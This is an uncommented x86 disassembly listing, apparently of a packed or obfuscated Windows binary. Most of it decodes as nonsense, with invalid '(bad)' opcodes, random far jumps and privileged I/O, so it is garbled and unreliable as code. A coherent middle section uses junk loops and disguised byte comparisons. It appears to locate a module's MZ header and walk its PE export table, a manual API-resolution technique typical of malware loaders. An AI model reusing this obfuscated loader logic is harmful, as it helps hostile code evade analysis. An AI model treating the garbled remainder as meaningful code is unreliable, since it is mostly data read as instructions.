  40e2d0:	mov    esi,DWORD PTR ds:0xa9ed806e
  40e2d6:	mov    al,0xc7
  40e2d8:	dec    esp
  40e2d9:	pop    edi
  40e2da:	push   es
  40e2db:	push   es
  40e2dc:	sub    esi,DWORD PTR [edi+0x52613e08]
  40e2e2:	xchg   esi,eax
  40e2e3:	inc    esi
  40e2e4:	arpl   WORD PTR [edx+esi*4],sp
  40e2e7:	mov    edi,0x2df857a2
  40e2ec:	fild   DWORD PTR [esp+ebx*2]
  40e2ef:	inc    ecx
  40e2f0:	and    eax,0x23341b90
  40e2f5:	daa    
  40e2f6:	jecxz  0x40e350
  40e2f8:	or     DWORD PTR [ecx-0x6b],0x47
  40e2fc:	dec    esi
  40e2fd:	push   si
  40e2ff:	and    DWORD PTR [esi-0x4f774d6b],edx
  40e305:	and    ecx,DWORD PTR [edi-0x73fb2f30]
  40e30b:	add    dh,BYTE PTR [edi]
  40e30d:	ror    ecx,1
  40e30f:	pushf  
  40e310:	xchg   ebp,eax
  40e311:	mov    ebp,0x88fbf6d2
  40e316:	add    esp,DWORD PTR [edx+0x5f5017e1]
  40e31c:	js     0x40e390
  40e31e:	ror    BYTE PTR [ebp-0x6dfd689b],0x55
  40e325:	pop    esp
  40e326:	push   edi
  40e327:	loop   0x40e35a
  40e329:	retf   
  40e32a:	outs   dx,BYTE PTR ds:[esi]
  40e32b:	shr    BYTE PTR [edx+0x13],1
  40e32e:	mov    ds:0xdcb3ba08,eax
  40e333:	xor    BYTE PTR [eax],ch
  40e335:	ss mov dh,0xd4
  40e338:	int3   
  40e339:	xlat   BYTE PTR fs:[ebx]
  40e33b:	xor    ah,ch
  40e33d:	and    al,0x35
  40e33f:	pop    edx
  40e340:	add    eax,0x77a9da6c
  40e345:	adc    DWORD PTR [eax],eax
  40e347:	push   eax
  40e348:	cli    
  40e349:	add    al,0x1
  40e34b:	inc    ebp
  40e34c:	outs   dx,BYTE PTR ds:[esi]
  40e34d:	xor    esi,ebx
  40e34f:	mov    eax,ds:0x118bb1e
  40e354:	adc    bh,BYTE PTR [esp+ecx*2-0x51]
  40e358:	shr    BYTE PTR [esi+0x4e],cl
  40e35b:	sbb    dl,BYTE PTR ds:0xa6544be0
  40e361:	pushf  
  40e362:	xor    ah,BYTE PTR [ebp-0x79fb9f3d]
  40e368:	out    dx,al
  40e369:	push   edx
  40e36a:	(bad)  
  40e36b:	mov    al,0x56
  40e36d:	xchg   ebx,eax
  40e36e:	ret    0x1ff
  40e371:	div    BYTE PTR [edx]
  40e373:	in     eax,0x21
  40e375:	imul   ebp,DWORD PTR [esi-0x69],0x78
  40e379:	mov    WORD PTR [edi],es
  40e37b:	add    eax,edx
  40e37d:	imul   eax,DWORD PTR [esi]
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x3865ef2
  40e671:	shl    DWORD PTR ds:[ebx-0x36],cl
  40e675:	jp     0x40e6f1
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e69c
  40e67c:	xlat   BYTE PTR ds:[ebx]
  40e67d:	jb     0x40e696
  40e67f:	scas   al,BYTE PTR es:[edi]
  40e680:	push   0x60c9b9db
  40e685:	xchg   ebx,eax
  40e686:	mov    cl,0x80
  40e688:	loopne 0x40e643
  40e68a:	xor    ch,BYTE PTR [esi+0x2b3fc82c]
  40e690:	jmp    0x40e64e
  40e692:	aas    
  40e693:	div    BYTE PTR [edi]
  40e695:	inc    esi
  40e696:	push   cs
  40e697:	jo     0x40e690
  40e699:	test   BYTE PTR [ebp+0x2],al
  40e69c:	daa    
  40e69d:	sar    dl,cl
  40e69f:	test   dl,cl
  40e6a1:	stc    
  40e6a2:	xchg   esi,eax
  40e6a3:	fdivr  DWORD PTR [edi]
  40e6a5:	xchg   esi,eax
  40e6a6:	add    ah,BYTE PTR [ecx+0x6c2b40d5]
  40e6ac:	mov    ?,WORD PTR [esi-0x5c]
  40e6af:	adc    ah,ch
  40e6b1:	jae    0x40e6e5
  40e6b3:	out    dx,eax
  40e6b4:	jg     0x40e70c
  40e6b6:	dec    ebx
  40e6b7:	pop    edi
  40e6b8:	cmp    al,BYTE PTR [esi-0xe]
  40e6bb:	ds inc ebx
  40e6bd:	fnstenv [ebp-0x32]
  40e6c0:	out    0xc4,al
  40e6c2:	lock or eax,0x35118f58
  40e6c8:	or     DWORD PTR [ebp+0x614aa9dc],ebp
  40e6ce:	dec    di
  40e6d0:	cmp    ebx,DWORD PTR [edx-0x4169d49c]
  40e6d6:	and    DWORD PTR [ecx+0x2e6f7bc5],esp
  40e6dc:	aad    0xff
  40e6de:	call   0x8a0f2ca0
  40e6e3:	loope  0x40e708
  40e6e5:	and    al,0xfb
  40e6e7:	add    edi,DWORD PTR [ebp-0x427d94ab]
  40e6ed:	mov    edi,0x43a399dd
  40e6f2:	sbb    al,0x87
  40e6f4:	clc    
  40e6f5:	sar    DWORD PTR [ebx+0x4f76e29a],cl
  40e6fb:	add    BYTE PTR [ebp-0x20],al
  40e6fe:	sti    
  40e6ff:	pop    edx
  40e700:	jae    0x40e6a3
  40e702:	stc    
  40e703:	int    0xb4
  40e705:	js     0x40e72c
  40e707:	fstp   st(3)
  40e709:	lea    edx,[esi]
  40e70b:	shr    DWORD PTR [ebx+0x22],1
  40e70e:	in     eax,dx
  40e70f:	xor    DWORD PTR ds:0xa495ef39,ecx
  40e715:	fnstenv [eax+0xf6452fc]
  40e71b:	adc    BYTE PTR [edi],ah
  40e71d:	jg     0x40e726
  40e71f:	(bad)  
  40e720:	in     al,dx
  40e721:	pop    edi
  40e722:	stos   BYTE PTR es:[edi],al
  40e723:	mov    dh,0x8f
  40e725:	and    cl,ch
  40e727:	xor    al,0x14
  40e729:	xchg   esp,eax
  40e72a:	add    eax,0xced117b5
  40e72f:	rol    BYTE PTR [eax-0x6a],cl
  40e732:	ror    al,cl
  40e734:	test   al,0xc
  40e736:	mov    dl,0xd1
  40e738:	out    0x10,al
  40e73a:	ins    DWORD PTR es:[edi],dx
  40e73b:	fcmovbe st,st(4)
  40e73d:	out    0x5c,eax
  40e73f:	mov    ecx,0x7093586b
  40e744:	adc    al,0x1a
  40e746:	or     ebp,DWORD PTR [esi+0x54]
  40e749:	fwait
  40e74a:	int    0x78
  40e74c:	arpl   WORD PTR [eax+0x6f328587],dx
  40e752:	sbb    esp,DWORD PTR [edi+0x667d1465]
  40e758:	adc    dl,BYTE PTR [ebx-0x61]
  40e75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e75c:	pop    esi
  40e75d:	test   al,0x5e
  40e75f:	cmp    eax,ebx
  40e761:	pop    eax
  40e762:	mov    bl,0x1
  40e764:	pop    es
  40e765:	adc    esi,0x5b
  40e768:	jo     0x40e7cb
  40e76a:	mov    cl,ch
  40e76c:	test   ebp,ebx
  40e76e:	ja     0x40e6f5
  40e770:	sahf   
  40e771:	das    
  40e772:	call   0xb8fb:0x281ef49f
  40e779:	sub    eax,DWORD PTR [esi+0x57]
  40e77c:	in     al,0x18
  40e77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e77f:	pop    edx
  40e780:	inc    edx
  40e781:	add    BYTE PTR [edi-0x3e],al
  40e784:	leave  
  40e785:	push   0xffffffbc
  40e787:	ds (bad) 
  40e78a:	sub    DWORD PTR [ebx],0x15
  40e78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e78e:	add    eax,0x62302e
  40e793:	shl    BYTE PTR [eax-0x33],1
  40e796:	mov    ebp,0x5e39eac2
  40e79b:	ja     0x40e768
  40e79d:	loope  0x40e816
  40e79f:	jmp    0xf4b9e092
  40e7a4:	sbb    edx,edx
  40e7a6:	nop
  40e7a7:	pop    ebx
  40e7a8:	xor    DWORD PTR [esi],0x68
  40e7ab:	mov    ecx,DWORD PTR [edi]
  40e7ad:	lods   eax,DWORD PTR ds:[esi]
  40e7ae:	jo     0x40e7c6
  40e7b0:	les    ebp,FWORD PTR [ebp+0x21]
  40e7b3:	sub    BYTE PTR [eax-0x5a6dee80],0xea
  40e7ba:	inc    ebx
  40e7bb:	mov    ebp,0x2093d9d
  40e7c0:	outs   dx,BYTE PTR ds:[esi]
  40e7c1:	shl    DWORD PTR [ebx+0x54409ec5],1
  40e7c7:	mov    edi,0xee600d6c
  40e7cc:	in     eax,dx
  40e7cd:	shr    DWORD PTR [ecx-0x619ff99],0xe1
  40e7d4:	mov    DWORD PTR [ebp+0x38],eax
  40e7d7:	mov    DWORD PTR [ebx+eiz*2+0x5b],esp
  40e7db:	xchg   edi,eax
  40e7dc:	call   0x9c80:0xc60d48e9
  40e7e3:	mov    DWORD PTR [eax+edi*8+0x13560ab7],ebx
  40e7ea:	mov    al,ds:0x34573f9a
  40e7ef:	ins    DWORD PTR es:[edi],dx
  40e7f0:	dec    ecx
  40e7f1:	or     bh,BYTE PTR [ebx-0x24]
  40e7f4:	xchg   BYTE PTR [edx+edx*8],al
  40e7f7:	dec    esi
  40e7f8:	daa    
  40e7f9:	mov    esp,DWORD PTR [ebx+0x2d]
  40e7fc:	int3   
  40e7fd:	ficomp DWORD PTR [esi+0x3d]
  40e800:	push   ebx
  40e801:	(bad)  
  40e802:	jnp    0x40e86d
  40e804:	cmp    eax,DWORD PTR [eax-0x4082e5aa]
  40e80a:	jmp    0xd870:0x313289b0
  40e811:	mov    BYTE PTR [edx+ebp*8-0x9649eef],bl
  40e818:	out    0x43,eax
  40e81a:	pop    esi
  40e81b:	pop    es
  40e81c:	mov    dh,0x79
  40e81e:	push   edx
  40e81f:	(bad)  
  40e820:	and    edi,ebx
  40e822:	scas   al,BYTE PTR es:[edi]
  40e823:	clc    
  40e824:	add    ecx,DWORD PTR [edi]
  40e826:	icebp  
  40e827:	call   0x5991:0xb985a1ad
  40e82e:	lods   eax,DWORD PTR ds:[esi]
  40e82f:	clc    
  40e830:	mov    bl,0x96
  40e832:	add    BYTE PTR [edx-0xc],cl
  40e835:	ins    DWORD PTR es:[edi],dx
  40e836:	sbb    bl,BYTE PTR [ecx+eax*4-0x23]
  40e83a:	push   0xffffff82
  40e83c:	jmp    FWORD PTR [ecx-0x10bc14bf]
  40e842:	stc    
  40e843:	in     al,dx
  40e844:	js     0x40e81a
  40e846:	xlat   BYTE PTR ds:[ebx]
  40e847:	retf   
  40e848:	and    BYTE PTR fs:0xb816a7a4,al
  40e84f:	popf   
  40e850:	push   edx
  40e851:	popa   
  40e852:	outs   dx,DWORD PTR gs:[esi]
  40e854:	leave  
  40e855:	xlat   BYTE PTR ds:[ebx]
  40e856:	adc    eax,0xf885762e
  40e85b:	inc    ecx
  40e85c:	mov    ds:0x58d6b641,eax
  40e861:	push   ebp
  40e862:	adc    edx,DWORD PTR [esi-0x18851035]
  40e868:	xchg   BYTE PTR cs:[eax+0x4886dc94],ah
  40e86f:	aam    0xed
  40e871:	stos   DWORD PTR es:[edi],eax
  40e872:	xor    ecx,0x6fd914d0
  40e878:	fscale 
  40e87a:	sub    ah,BYTE PTR [ecx]
  40e87c:	cmp    BYTE PTR [edi],cl
  40e87e:	fldcw  WORD PTR [eax]
  40e880:	xchg   esp,eax
  40e881:	stos   BYTE PTR es:[edi],al
  40e882:	data16 mov al,BYTE PTR [ebp+0x33299f7f]
  40e889:	retf   
  40e88a:	into   
  40e88b:	(bad)  
  40e88c:	jbe    0x40e8c9
  40e88e:	mov    ch,BYTE PTR [edx+0x40]
  40e891:	push   ecx
  40e892:	sbb    ch,bh
  40e894:	fs push ecx
  40e896:	xor    DWORD PTR cs:0xabd3f97f,0xda7b7c04
  40e8a1:	xor    ebx,DWORD PTR [esi+edi*1+0x4898f943]
  40e8a8:	stos   DWORD PTR es:[edi],eax
  40e8a9:	push   edi
  40e8aa:	(bad)  
  40e8ab:	mov    esi,0x1cc80951
  40e8b0:	mov    edi,0x7b25f446
  40e8b5:	or     dh,BYTE PTR [ebx+0x55]
  40e8b8:	mov    BYTE PTR [edx-0x480a077e],al
  40e8be:	fdiv   QWORD PTR [ebp+edx*1+0x3e]
  40e8c2:	xchg   ebp,eax
  40e8c3:	mov    ds:0xeadc667d,al
  40e8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8c9:	xchg   edx,eax
  40e8ca:	mov    eax,0xbd6977e1
  40e8cf:	jne    0x40e943
  40e8d1:	push   0xf3dcd69d
  40e8d6:	mov    DWORD PTR [ebx+eiz*4-0x60],edx
  40e8da:	ficom  WORD PTR [edi]
  40e8dc:	or     DWORD PTR [edx+0x2],eax
  40e8df:	push   ds
  40e8e0:	stos   DWORD PTR es:[edi],eax
  40e8e1:	ret    0x1838
  40e8e4:	xchg   ebx,eax
  40e8e5:	ss dec esp
  40e8e7:	hlt    
  40e8e8:	js     0x40e8fb
  40e8ea:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40e8ec:	in     al,0xb0
  40e8ee:	sahf   
  40e8ef:	loop   0x40e91a
  40e8f1:	cld    
  40e8f2:	push   esi
  40e8f3:	dec    ebp
  40e8f4:	mov    dl,0x5d
  40e8f6:	jno    0x40e88f
  40e8f8:	push   0x23
  40e8fa:	aad    0x0
  40e8fc:	sbb    DWORD PTR [ecx+0x48],ebx
  40e8ff:	cmc    
  40e900:	inc    eax
  40e901:	adc    eax,0xec4c01e0
  40e906:	mov    ecx,DWORD PTR [edx]
  40e908:	shl    DWORD PTR [edx],0x5e
  40e90b:	jecxz  0x40e907
  40e90d:	jg     0x40e984
  40e90f:	mov    ds:0x84ae66f8,al
  40e914:	pop    ebx
  40e915:	je     0x40e8fb
  40e917:	push   cs
  40e918:	mov    cl,0x4f
  40e91a:	lahf   
  40e91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e91c:	pop    ecx
  40e91d:	fidivr DWORD PTR [edx+0x4ffa905f]
  40e923:	out    dx,eax
  40e924:	aas    
  40e925:	mov    dl,0xdb
  40e927:	add    BYTE PTR [ebp-0x4d],ch
  40e92a:	inc    esi
  40e92c:	sahf   
  40e92d:	push   DWORD PTR [esi-0x6f]
  40e930:	mov    bl,0xbe
  40e932:	xor    al,0xf9
  40e934:	dec    ecx
  40e935:	addr16 ret 0x52ed
  40e939:	out    dx,eax
  40e93a:	rcl    BYTE PTR [eax+0x790eae9f],1
  40e940:	shr    BYTE PTR [edx+eax*2+0x64],1
  40e944:	mov    ch,0x26
  40e946:	jmp    0xa4204ab0
  40e94b:	mov    eax,0xc0659bc
  40e950:	sub    al,0x48
  40e952:	add    eax,0x64f6819a
  40e957:	out    0x15,al
  40e959:	mov    esi,0xdb3f7123
  40e95e:	in     eax,0x29
  40e960:	or     eax,0x47824f4e
  40e965:	push   cs
  40e966:	push   ebx
  40e967:	xor    al,0x98
  40e969:	icebp  
  40e96a:	repz pop ds
  40e96c:	and    dh,ch
  40e96e:	rol    DWORD PTR [ebx],0xd
  40e971:	sbb    DWORD PTR [edi],ebx
  40e973:	cmp    esi,DWORD PTR [edi]
  40e975:	je     0x40e9c3
  40e977:	or     esp,edi
  40e979:	xor    DWORD PTR ds:0x69c24b56,ebx
  40e97f:	int    0x2b
  40e981:	cmp    BYTE PTR [esp+ecx*1+0x5b],dl
  40e985:	lea    edi,[eax]
  40e987:	pop    ebx
  40e988:	dec    eax
  40e989:	clc    
  40e98a:	cdq    
  40e98b:	cmc    
  40e98c:	das    
  40e98d:	sub    edx,DWORD PTR [ecx]
  40e98f:	add    DWORD PTR [edi-0x6a],ecx
  40e992:	imul   eax,DWORD PTR [esi],0xffffffc8
  40e995:	mov    edi,0xca21434e
  40e99a:	fimul  WORD PTR [ebx]
  40e99c:	aaa    
  40e99d:	lock aas 
  40e99f:	inc    esi
  40e9a0:	pop    ebx
  40e9a1:	(bad)  
  40e9a2:	push   esp
  40e9a3:	ins    DWORD PTR es:[edi],dx
  40e9a4:	repnz inc esp
  40e9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a7:	sahf   
  40e9a8:	add    al,0x24
  40e9aa:	adc    al,0xbf
  40e9ac:	pop    ebx
  40e9ad:	stos   DWORD PTR es:[edi],eax
  40e9ae:	mov    cl,0x85
  40e9b0:	or     ebx,DWORD PTR [edx]
  40e9b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9b3:	jmp    0x6a22356a
  40e9b8:	or     cl,BYTE PTR [ebx+edx*8-0x46]
  40e9bc:	fisubr DWORD PTR ds:0x260f486d
  40e9c2:	ins    BYTE PTR es:[edi],dx
  40e9c3:	sub    DWORD PTR [edx-0x44],esi
  40e9c6:	add    esi,DWORD PTR [eax-0x63]
  40e9c9:	xor    dh,ah
  40e9cb:	test   BYTE PTR [edi-0x5d],0x8d
  40e9cf:	(bad)  
  40e9d1:	adc    al,0x47
  40e9d3:	loop   0x40e984
  40e9d5:	pusha  
  40e9d6:	ret    
  40e9d7:	mov    cl,0x7
  40e9d9:	sbb    DWORD PTR [esi+0x23],ebp
  40e9dc:	out    0x51,al
  40e9de:	jle    0x40e9a1
  40e9e0:	jecxz  0x40e99f
  40e9e2:	je     0x40ea2d
  40e9e4:	jmp    0xfe93a15c
  40e9e9:	jp     0x40ea26
  40e9eb:	xor    eax,0x5ac4d9b3
  40e9f0:	aam    0xab
  40e9f2:	jmp    0x674b127e
  40e9f7:	xor    eax,0xb42354af
  40e9fc:	cmp    edi,DWORD PTR [ecx]
  40e9fe:	pusha  
  40e9ff:	sbb    al,0xa3
  40ea01:	push   esp
  40ea02:	xchg   bl,cl
  40ea04:	xor    cl,al
  40ea06:	mov    ebp,0x390d2495
  40ea0b:	cmp    al,0x37
  40ea0d:	arpl   WORD PTR [edi-0x7b23d806],di
  40ea13:	(bad)  
  40ea14:	cdq    
  40ea15:	inc    esp
  40ea16:	xor    ch,BYTE PTR [edi]
  40ea18:	outs   dx,DWORD PTR ds:[esi]
  40ea19:	pop    edi
  40ea1a:	pop    es
  40ea1b:	je     0x40e9d6
  40ea1d:	popf   
  40ea1e:	or     ch,BYTE PTR [ecx+0x5ad054f9]
  40ea24:	or     BYTE PTR [edx+edx*2],ch
  40ea27:	and    eax,0x5b4fa9f8
  40ea2c:	lock iret 
  40ea2e:	pop    es
  40ea2f:	mov    ebx,0xb94afd60
  40ea34:	imul   BYTE PTR [edi]
  40ea36:	adc    al,0x69
  40ea38:	mov    eax,0x146c693a
  40ea3d:	ins    DWORD PTR es:[edi],dx
  40ea3e:	imul   eax,edi,0xd9fa3420
  40ea44:	pop    ss
  40ea45:	ret    
  40ea46:	call   0xceef96f8
  40ea4b:	mov    bl,0x53
  40ea4d:	(bad)  
  40ea4e:	icebp  
  40ea4f:	ret    
  40ea50:	mov    ss,edi
  40ea52:	push   edx
  40ea53:	loop   0x40ea48
  40ea55:	pop    ecx
  40ea56:	pop    ds
  40ea57:	mov    cs,WORD PTR [edi]
  40ea59:	into   
  40ea5a:	push   cs
  40ea5b:	pop    eax
  40ea5c:	test   al,0xcd
  40ea5f:	jmp    0x40ead3
  40ea61:	sbb    ch,bh
  40ea63:	pushf  
  40ea64:	pushf  
  40ea65:	imul   al
  40ea67:	mov    eax,ds:0x4bfe6df1
  40ea6c:	xchg   esp,eax
  40ea6d:	(bad)
  40ea72:	jno    0x40ea6f
  40ea74:	in     al,dx
  40ea75:	add    dh,BYTE PTR [edx]
  40ea77:	in     eax,0x13
  40ea79:	pop    ecx
  40ea7a:	jp     0x40eab0
  40ea7c:	repz test BYTE PTR [eax+0x1f],dh
  40ea80:	ret    0xddf3
  40ea83:	push   0xde6582ce
  40ea88:	xor    DWORD PTR [ecx-0x50],esi
  40ea8b:	mov    BYTE PTR [ecx-0x66],dh
  40ea8e:	push   eax
  40ea8f:	cs popf 
  40ea91:	or     BYTE PTR [edx-0x80],ch
  40ea94:	fdiv   DWORD PTR [edx-0x1d676588]
  40ea9a:	mov    dh,0x4e
  40ea9c:	(bad)  
  40ea9d:	dec    esi
  40ea9e:	aam    0x29
  40eaa0:	mov    edx,0xcae12514
  40eaa5:	mov    DWORD PTR [esi-0x7f],ebx
  40eaa8:	push   0xffffff80
  40eaaa:	daa    
  40eaab:	push   cs
  40eaac:	je     0x40eb1e
  40eaae:	cmp    al,0x86
  40eab0:	into   
  40eab1:	mov    cl,0x1d
  40eab3:	(bad)  
  40eab4:	xlat   BYTE PTR ds:[ebx]
  40eab5:	add    ch,cl
  40eab7:	jbe    0x40eab2
  40eab9:	push   ebx
  40eaba:	jecxz  0x40ea6f
  40eabc:	jae    0x40eb08
  40eabe:	shr    BYTE PTR [esi+esi*4-0x2a],cl
  40eac2:	dec    ebp
  40eac3:	popa   
  40eac4:	xor    ah,bl
  40eac6:	xor    al,0x4c
  40eac8:	(bad)  
  40eac9:	adc    bh,BYTE PTR [esp+ecx*1-0x56]
  40eacd:	pop    edx
  40eace:	xor    edx,0xb9d2c539
  40ead4:	leave  
  40ead5:	fisub  WORD PTR [ecx]
  40ead7:	push   eax
  40ead8:	icebp  
  40ead9:	push   eax
  40eada:	dec    esp
  40eadb:	and    DWORD PTR [eax],ebx
  40eadd:	cli    
  40eade:	lods   al,BYTE PTR ds:[esi]
  40eadf:	pop    ss
  40eae0:	cmp    al,0xaf
  40eae2:	sbb    ecx,DWORD PTR [ebp+esi*2-0x45f9c18c]
  40eae9:	sub    esp,eax
  40eaeb:	cmc    
  40eaec:	pop    edi
  40eaed:	mov    al,0x65
  40eaef:	xchg   ebp,eax
  40eaf0:	daa    
